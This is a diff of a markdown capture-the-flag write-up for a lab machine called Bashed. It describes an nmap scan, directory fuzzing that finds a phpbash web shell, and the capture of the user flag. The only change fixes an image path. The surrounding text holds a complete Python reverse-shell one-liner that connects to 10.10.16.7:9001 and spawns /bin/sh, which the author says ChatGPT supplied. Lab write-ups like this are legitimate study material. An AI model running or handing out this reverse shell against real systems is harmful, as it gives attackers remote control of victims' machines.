@@ -5,7 +5,7 @@ The nmap scan revealed the only port 80 with no ssh which is unsusual.
 I opened the site at http and creator of the site has disclosed the information that he incorporated phpbash on this site.  
 So i fuzzed directories and appended phpbash.php and found its location at /dev. So there goes the user flag.   
 [fuzz](images/bashed/fuzzz-bash.png)
-[bash](phpbash-bash.png)
+[bash](images/bashed/phpbash-bash.png)
 Then i attempted to get reverse shell to my own machine however using basic bash syntax didnt work for some reason.  
 Then chatgpt gave me this fuckass long python command to get reverse shell and it worked.  
 python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.16.7",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"]);'  
